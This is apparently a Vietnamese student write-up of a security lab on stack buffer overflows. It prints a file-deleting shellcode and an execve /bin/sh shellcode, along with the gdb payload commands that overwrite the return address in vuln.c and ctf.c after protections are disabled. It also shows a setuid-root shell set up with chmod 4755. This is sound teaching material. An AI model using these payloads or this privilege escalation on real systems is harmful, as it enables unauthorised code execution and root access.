Lab 2:\
chạy docker:\
`docker run -it --privileged -v $HOME/Seclabs:/home/seed/seclabs img4lab`
# Inject code to delete file: file_del.asm is given on github

## chú ý lớn!!!
- bài lab1: file_del.asm chú ý tới các dữ liệu \x0a và \x00
- bài lab2: ctf.c không cần lấy quyền shell mà cần truy cập vào và chạy được hàm `myfun`

Ý tưởng:

-   Program injected: file_del.o được biên dịch từ file_del.asm
    
-   Đối tượng bị chèn vào: vuln.c

Các bước:

1. Dịch mã máy từ file_del.asm thành file_del.o\
    `nasm -g -f elf file_del.asm `\
 ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcQIVWHD1iadEHZep9K55e_2ob3jPBDXtqATQvb2qYfaehaLJTSHs5a559M3ou6fiOHEsKmc6uHWB5tCYEX2KMpToq_9tXAv-cxStpYBDMPx3IIIezR5eGXcBnO3N3sBblCRcEaAfaMxKcXvaIU2hL0fgY?key=x066aHYoH5XtbJjV6Ng-LQ)

2. Link file_del.out với lệnh file_del\
`ld -m elf_i386 -o file_del file_del.o `\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe3OoBdDkJp7idolhrmbYqguAbCsucW-GmHHkZTe7K612tfmLV4TcLGM9eU9VmJvhigM5Is-yV1iPp2QqhUUA96KnBvI157uJHKOeWYpOZCPYhGqKFnYaR3qMZJ4BoCFRs3tJ3TnzWya98PaqG3p9GkbRg?key=x066aHYoH5XtbJjV6Ng-LQ)\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXegracxlM1zwXtsRKM-UvdedDnAFX7Rr0_y1f9hk69cyo_QVk_ABSouIeEUqBqqnBYj2XhFaAFa4INaItF92kdju1VYlmu7LCYn0S939wzsQUQInbKMfzjNC4U5voC61pBVK89nIfzHdLzBcs4MsHKcHF-_?key=x066aHYoH5XtbJjV6Ng-LQ)
    
3. Disassem chương trình file_del  
`objdump -d file_del `\
    ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdTjMDyYv459ARkFwM9iVfszV8aeJE3pogQ5IPYlufXx9Gf1qQDDftJlwaLM5yJiLbRZYtzNP-EaMvejM5RU950YWJxdHmzckZM0Q7UdjbeUO2Bi92d8AULobsOv6Re5rWjZQ6TGi7CHwxng5A7CPMoBDY?key=x066aHYoH5XtbJjV6Ng-LQ)
    
4. dịch chương trình file_del từ hợp ngữ thành mã máy  
`for i in $(objdump -d file_del | grep "^ " | cut -f2);do echo -n '\x'$i; done; echo`![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfYe2o8lL9kwg5bMXu5xrWoTK0nbyTZOfOgPZHnBrPs2UN3J3_hDuEBJ146ykJ9eTJakeoCwk09ebR_U4ZLgwJ3JPdjFAYH_G1EI_5crtOycEp9wxnL6cMFy4aNGHSWCuqsJ1KoJ2WO386-E3fueU9RqM8?key=x066aHYoH5XtbJjV6Ng-LQ)  
Kết quả cho ra là: `\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00\xdummyfile.`
    
5.  Dịch chương trình đối tượng: vuln.c thành vuln.o  
`gcc -g vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack`\
    ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeZ9ABA_1KiObJj2QUfm6Hy0BQ6SDoLV799XuttVum_Da6bMdiU-LALTjo86pyipoozIXO9kPrxy60iQeC3Cgvy3fMbLJoKTqHTQkVKQ-L-p4m1uOSpWZWKsFD3TXLvw8g_HO84sy0dn-HW8zux31lIarNM?key=x066aHYoH5XtbJjV6Ng-LQ)
    
6.  aaa  
`sudo ln -sf /bin/zsh /bin/sh`\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcB9mQh9boKp_0s3id9x_TNV91mrWeBvm6giv1E19Y358fttoRP8wzQybKpKhyhgKIYMp7qvA1d4rit8dM15g8Pukrfs161es2HPhcYO24Ka3RPjyUkDUYNkSfwkMsmW-Q4Q3vfiRSq8y4c6zZp1K3O3uI1?key=x066aHYoH5XtbJjV6Ng-LQ)  
    (Password: dees)
    
7.  Debug chương trình đối tượng vuln.out  
`gdb -q vuln.out`\
(P/s: -q Quite: không bla bla, chạy thẳng vào chương trình debug. Demo below:)
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeOZuT-Y-D8xTgQBQrJQ-cXwgbygc-iFygnB75Z1qQvpNNsWYlA_cbCPUhAbX7PMiuf34GHBlieU_948BYMNjBZbKzS_XNbEvlTZUNh6iJVLnE04B8F1UvrRExk2Bvgja6DkTl9IBmWBL211usvNf_1ASzY?key=x066aHYoH5XtbJjV6Ng-LQ)
    
8.  Disassemble hàm main để đặt breakpoint trước và sau khi chạy lệnh strcpy\
`disas main`\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfAvMCRd8vadEfkSaTVBCoZ342_LVShHjvyN91qksvL1yJGLZRjfWF2PXPEQ4ILy76HmtYIUSIQ0EmAJTOixGPRBfFIElYRTQk4VF_rpz2j251MbyQL6IYW2QkJul-Ybz9pmK_T8UoSAVexqbN5cS_TUh4?key=x066aHYoH5XtbJjV6Ng-LQ)
1.  Đặt breakpoint tại vị trí 1 và 2 theo hình trên:  
    Lý do:
    - Sau khi chương trình đã hoàn thành khởi tạo stack: push ebp vào stack, lưu esp = ebp, push biến khởi tạo (char buf[64]) vào trong stack (0x40 là 64 byte ở dạng thập lục)  
    - Sau khi hoàn thành lệnh strcpy và đã giải phóng ebp và trở về return address (‘ra’)  
    Bằng lệnh:\
    `b *0x08048441`\
    `b *0x0804846b`\
    ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXddHftwjaIAomnUfTJbftN778zpVZ7UGwCBSxIZfyjFhr-LKIfp3OEiALnL301NVmJmIO82_EB7UizAap2boWu8ceWCdBSGEN9tXU2jAEWXiRYtNhE0ThPofS5SUFLy6taM1zBIhgCsYpNWHdlTSIpyn7vm?key=x066aHYoH5XtbJjV6Ng-LQ)  
    Extra: Kiểm tra breakpoint bằng `info breakpoint` và xoá breakpoint bằng lệnh `del [số thứ tự của breakpoint]`
    
2.    Chạy debug chương trình vuln.out với giá trị đầu vào của argv[]  
 `r $(python -c "print('\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65' + 'a' * 23 + '\xff\xff\xff\xff')")`\
Giải thích: r Run chương trình python [...]\
`print(“[chương trình file_del ở dạng mã máy] + ‘a’ 23 lần + [giá trị ngẫu nhiên]”)`\
Giải thích về ‘a’ 23 lần:\
Stack của hàm main()\
    ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfd6JeOXapIP7aCfbg4igVY2MpOmVbFiGD7LE8d4SOo7c3pcZr84dJY9nzmbaxlUOg_ynd7RZJXJUmQOmIWjK_YLcXVz2CvDR7t_2sfwvOA22EvF64c-C6ajoD3lT5KJThR2UrEzAa23sbQ3OkBLGn8eNR6?key=x066aHYoH5XtbJjV6Ng-LQ)\
    Ảnh chi tiết từ buf đến ‘ra’ của stack main  
    ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeCyYQ75GmFBipRzNUaydXbMvXR8RN4B3hlsIOJsqMyJ9E0GRhn_o2I2Fu9bsYjiKrOjE7BapKD7w4yiTk0N6_4oy5dhPgO1g1CkGy55vfiJXW6l45u_7nhjPkQm--p5a3xnUkSR0Kk6spOttI8a59PVv4z?key=x066aHYoH5XtbJjV6Ng-LQ)\
    biến buf có dung lượng là 64 bytes, chúng ta cần ‘tiêm’ chèn vào trong biến mất 45 bytes nghĩa là buf còn lại 19 byte và chúng ta cần fill hết 19 byte đó bằng ký tự ‘a’  
    Phía dưới của biến buf là ebp (base pointer aka frame pointer/ extended base pointer) có dung lượng là 4 bytes và chúng ta cũng cần fill với 4 ký tự ‘a’\  
    Đến ‘ra’ cũng có dung lượng là 4 bytes và đó là nơi chúng ta lưu vị trí của chương trình file_del cũng là địa chỉ của con trỏ esp (extended stack pointer) (sau khi hoàn thành stack thì con trỏ esp luôn ở trên cùng của stack nghĩa là ở trên của biến cuối cùng được thêm vào)  
    ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeHTpass1StoowTLUFxMn5xafGO36vV_wkI_SVay1hUVfVpCTx_V-cVMbZ26_gO8vpIVfkfMjgM9MwBwRbBBkC2pQpa53TZMHgLaDskrvPZbu1qMdySVA9GMuBuWGwRJjwnYSXMUxrsPD5k7C7Cixcq1V3G?key=x066aHYoH5XtbJjV6Ng-LQ)  
    ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdDv9Eu7I5ni-Qh99r9_2cDX1SA5yUocwOZ-_t8aoHKVIQLW4280dUStXPoZ5PMc8_wSDFxeFsh5VZBnCwcYdbCNhfn3D0x7nSxG6Qyo81BGRsyeU_3-J1QrR8r9HHupKCC1-tih8KqefnydkyBma1sC4t9?key=x066aHYoH5XtbJjV6Ng-LQ)\
1.    Xuất 80 bytes từ con trỏ esp\
`x/80xb $esp`\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdSCmk5Hs5I3KhndgTpi8Diiw9MUqPooEtUFEmbJKUg1Yyww2TGvfHu2B0zfreqNlEI30t3P1tXPthdHfvxojq8aiFJ22GvszBolgGJBU7KN4KJ0BqYpTA193aX93xVwLuYfx4BEHPrAnQImnjegUJ8-xF4?key=x066aHYoH5XtbJjV6Ng-LQ)  
    Giải thích: Tại sao lại là 80 bytes\
    ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXcQPYE671s2lYTm_FHnyDs6ZXezisSA_vVuGfHwpt8IW1VgBDZiKtSvEX5bEpEegM0qnaMouMNDjwx7jgo8XtibTHEPY7Ls2olWQZ9qTJnlYrnVn-5-PLEcLmUXgY2I5SRxf5lF2W1A9WtKvsLoppU9OflW?key=x066aHYoH5XtbJjV6Ng-LQ)\
    Stack của hàm main gồm argv[] 4 bytes, argc 4 byte, ‘ra’ 4 bytes, ebp 4 bytes, buf 64 bytes. Tổng là 4 + 4 + 4 + 4 + 64 = 80 bytes  
    Nghĩa là stack của hàm main có 80 bytes và con trỏ esp ở trên cùng của stack. Từ đó xuất 80 bytes từ con trỏ esp nghĩa là xuất hết các giá trị trong stack\
    ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe4ou9j0EvlDEoy84oX1NZkeSuU2MBEtUCOl1vg8LqEfihixKp4_0GDtnzdJLH_OQg0Oym1_zjIu_yhFIpurQWk0zrA_3gtYpVI11DBxzDAKh6eL1bhgHDsshPRGePL8zZV3RVAi2mEJxurr6OW3VZp168J?key=x066aHYoH5XtbJjV6Ng-LQ)\
1.    Chèn vị trí của esp (phía trên buf để chạy chương trình được chèn ở đầu buf) vào ‘ra’ để chương trình khi kết thúc stack sẽ chạy buf  
    *** Nhớ là set sau khi chương trình đã được chèn sau khi lệnh strcpy đã được thực thi nhá!\
    ![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXf1JUcca3oVFNhL4CKPK7T6KwycCIwyRycYLkaKNHFoNmyegmElOxY1fm6zTzDYQG7z3eJobQkiSEhX34c4iw0xxhatSKXEtDGoWlGui_NRSWTWZJDTI82civeUI3K1b0ulrCWC8O8vmddHbr78nq6Abtg?key=x066aHYoH5XtbJjV6Ng-LQ)  
    Done

# Conduct attack on ctf.c

 1.  Chuẩn bị môi trường để tấn công:  
    Tắt cấp phát địa chỉ stack ngẫu nhiên để dễ kiểm soát địa chỉ stack:mặc định là 2  
    `sudo sysctl -w kernel.randomize_va_space=0`\
    Tạo symbolic link tới zsh thay vì sh (default) để tránh bị ngăn chặn root từ Ubuntu  
    `sudo ln -sf /bin/zsh /bin/sh`
 2.  Biên dịch chương trình sh.asm thành sh.o rồi link thành sh để thực thi  
    `nasm -g -f elf sh.asm` -> tạo ra file sh.o\
    `ld -m elf_i386 -o sh sh.o` -> tạo ra file sh
 3.  sh là chương trình lấy quyền điều khiển của chương trình. Khi thực thi .sh sẽ xuất hiện shell ký hiệu là ‘$’ nghĩa là quyền thực thi chương trình của user seed (user hiện tại) chứ k phải quyền điều khiển root (administrator của window)\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdjWDrbmUojSXG2gSFc_rOfuPSMlVR6J-T80CbvtVILtQ3U-fxuyBjXYnqG_FNX7byv269EYQgmxAe6QTZyjUqK-yf4tCax4QDkrdiN1encz7Tqpj7D6UevY-qv0HDlgWU8IXM6jVLC8WkZ30eVN-1gL5M?key=x066aHYoH5XtbJjV6Ng-LQ)\
    Để *leo thang đặc quyền* cho chương trình sh có quyền của root ta thực hiện các thao tác sau.
 4.  Chuyển quyền sở hữu của file sh cho root 
    `sudo chown root sh`\
    (P/s: password là dees)\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdWMukUtYhNT4Nn661GgLPqcigp1s7Bbl5_WM920XBqHtfKfuKXbaiyFAE_fAKKsfBP9Abj3YaqLTGHYCIy3YvMGS2d_SSrkF0UZTvfwoEn2LlZiAWECLowpefRIbp0IfSMqAwqThSnL0CPiPDkQPpGkoDu?key=x066aHYoH5XtbJjV6Ng-LQ)\
    1.  Thay đổi quyền truy cập của file sh thành 4755  
   `sudo chmod 4755 sh`\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfJ0xaiH5bGbpyg07UphikAeWl0stG2k-9bG1U8quXxBxmz5FOihtScQjqhwNzm95eP6DRKyUwFG4gF7UpDjW44kE9qxlre2vUHd-gjUZut4oRm1EHugLl7WgIRz_BH6EZMVyI9vPyl0uElMdn2nksGbAG0?key=x066aHYoH5XtbJjV6Ng-LQ)  
    [Giải thích:      
    ](https://www.youtube.com/watch?v=lNEa855uipg)chmod Change mod  
    4 là chạy với quyền thực thi của owner thay vì là user, ở đây là quyền của root thay vì là của seed\
    7 là các quyền của owner: rwx là read write execute\
    5 là các quyền của group owner: r-x là read and execute\
    5 là các quyền của other user: r–x là read execute\
 1.  Sau đó chạy chương trình sh bằng `./sh`    
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfeLt4eWpp9H-LUhnnVA9go06SZWerG_iH10Z2sJEGlFkWDNSgK041MPHRCCoxLAaifCS3mXN5T419Pbfpy0Vce3KjPeXYZH9I0TbOFp0aczjgMvJ8eprFwn3UN9WxT33aLL64JD21d1bOtOYSfCvp0utDh?key=x066aHYoH5XtbJjV6Ng-LQ)  
    Dấu # sẽ hiện ra nghĩa là đang thực thi shell ở quyền root thay vì $ của user  
    Thoát bằng lệnh exit    
 1.  Biên dịch chương trình đối tượng ctf.c thành ctg.out với tắt các cơ chế bảo vệ để có thể tấn công:  
`gcc -g ctf.c -o ctf.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack`
 1.  Rã chương trình sh thành opcode  
`for i in $(objdump -d sh | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo`\
    Kết quả cho ra:\
`\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80  `\
    size: 27 bytes  
Debug chương trình ctf.out  
    `gdb -q ./ctf.out`  
Sau đó rã hàm vuln và tìm vị trí của chương trình trước khi chạy strcpy và sau khi đã khởi tạo stack\
    `disas vuln`\
    Tạo breakpoint tại các điểm trước và sau khi strcpy\
    `b *0x080485b3`\
    `b *0x080485c5`\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXe3i-Kb3Y6-4mdXDGx_SJBT4PeH2fjs8nbhCqYEfdS06sCekFfN1HC2pTVyUU_Q24H_MLbficsmxVcdUaFNy_uVWNSdNqcx0JZZ8Wr9BYaMaSlFJrsg_GvaOrhqsV2M9Ks15lxsDcgqIbWDBP2tge9C8yNq?key=x066aHYoH5XtbJjV6Ng-LQ)
 1. Chạy debug chương trình\
`r $(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80' + 'a' * 77 + '\xff\xff\xff\xff')")`\
Trong lần đầu chạy thì chương trình sẽ dùng ở breakpoint
1. Dùng lệnh `x/108xb $esp` để xuất 108 bytes kể từ địa chỉ của con trỏ esp.\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXdpuCT8PuyM6RgJHGoMm2Ct18_9HdO0kOFmKmWKnIuyRYaQVE9m7_lchyRN6qapxW9u49QFAilQDM8bS5AVjsL8XTgyQDNXK02C3xYqzbRUiZ_0yYKDClUet9JxbQGRoCkX37_xfoRG8-Jek8CVg1ApOy9Z?key=x066aHYoH5XtbJjV6Ng-LQ)\
Tiếp tục chương trình bằng lệnh `continue` để đến breakpoint 2.\
Dùng lệnh `x/108xb $esp` để xuất 108 bytes kể từ địa chỉ của con trỏ esp.
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXca0HqNLeIUkPjoaxLj4-ARRXDTrdT-ybpOfs6D2-jn8vwyzymxjDfWs-HwCy4oHCDsrsJyGRRPEBGDB2M5vExdvCH4o4ekCpqY3SrVXVjqdNV6RELQHhZPorSLVgO3J044UsbSfwovPrd6VN1RGB31Yih0?key=x066aHYoH5XtbJjV6Ng-LQ)\
Chương trình sh đã được chèn thành công vào trong buf[100] của chương trình ctf.out\
Chúng ta cần thay đổi địa chỉ của 'ra' thành địa chỉ của esp là địa chỉ xuất phát của chương trình được tiêm vào.\
`set *0xffffd6e0 = $esp`\
![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXfGOnFEzJ_1UQhRK4IywOlc59rBKJbLnrcqXipIsoAiBdUP2XlVqtWruwgJsHRWmzlB9p6LBBhIuh-qPR6JJY2YnZ6uLhCXIssncTiyR8gDYA0qBCAXeVVuebCc2za7lb3G9TkmsuOLSlWeh0cXSB3mc-kA?key=x066aHYoH5XtbJjV6Ng-LQ)\
*Giải thích: vì sao lại là 0xffffd6e0*\
*Vì tại địa chỉ bắt đầu của 'ra'*